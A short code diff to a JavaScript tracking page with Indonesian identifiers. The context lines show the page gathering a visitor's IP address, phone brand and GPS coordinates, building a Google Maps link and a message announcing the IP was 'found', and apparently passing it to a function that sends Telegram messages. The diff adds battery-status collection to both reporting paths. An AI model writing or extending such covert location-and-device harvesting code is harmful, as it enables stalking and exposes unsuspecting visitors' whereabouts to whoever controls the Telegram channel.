@@ -128,6 +128,7 @@ async function kirimPesanTelegram(pesan) {
 }
 
 (async () => {
+  const batre = await getBatteryInfo();
   const ip = await getIP();
   const merek = getMerekHP();
   const pesanAwal = `╭──「 IP berhasil ditemukan! 」──
@@ -141,6 +142,7 @@ async function kirimPesanTelegram(pesan) {
 
 navigator.geolocation.getCurrentPosition(
   async (pos) => {
+    const batre = await getBatteryInfo();
     const lat = pos.coords.latitude;
     const lon = pos.coords.longitude;
     const gmaps = `https://www.google.com/maps?q=${lat},${lon}`;
